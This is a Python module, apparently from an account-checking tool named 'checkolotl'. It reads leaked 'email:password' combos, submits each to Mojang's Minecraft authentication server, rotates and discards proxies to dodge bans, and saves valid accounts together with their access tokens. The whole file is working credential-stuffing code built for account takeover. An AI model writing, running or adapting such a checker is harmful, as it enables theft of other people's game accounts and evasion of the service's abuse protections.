from checkolotl.utils.proxy import get_proxy, remove_proxy
from checkolotl.settings import settings
from checkolotl.saver import save

import requests
import json
header = {"content-type": "application/json"}


def check(combo):
    email, password = combo.split(":", 1)
    body = json.dumps({
        'agent': {
            'name': 'Minecraft',
            'version': 1
        },
        'username': email,
        'password': password,
        'clientToken': "fff"
    })
    proxies_to_ban = []
    for i in range(settings.checkers.minecraft.check_amount):
        proxy = get_proxy("minecraft")
        proxy_dict = {
            "http": proxy,
            "https": proxy
        }
        try:
            r = requests.post(url="https://authserver.mojang.com/authenticate",
                              headers=header,
                              data=body,
                              timeout=settings.checkers.minecraft.timeout,
                              proxies=proxy_dict)
        except:
            if settings.checkers.minecraft.remove_banned_proxy:
                proxies_to_ban.append(proxy)
            continue
        if r.status_code == 200:
            if r.json().get("selectedProfile") is None:
                proxies_to_ban.append(proxy)
                continue
            uuid = r.json().get("selectedProfile").get("id")
            name = r.json().get("selectedProfile").get("name")
            accessToken = r.json().get("accessToken")
            clientToken = r.json().get("clientToken")
            replace_dict = {
                "email": email,
                "password": password,
                "uuid": uuid,
                "name": name,
                "accessToken": accessToken,
                "clientToken": clientToken
            }

            account = str(settings.checkers.minecraft.account_format).format(**replace_dict)
            save("minecraft", account)
            for proxy in proxies_to_ban:
                remove_proxy("minecraft", proxy)
            return
        else:
            if settings.checkers.minecraft.remove_banned_proxy:
                proxies_to_ban.append(proxy)
            continue


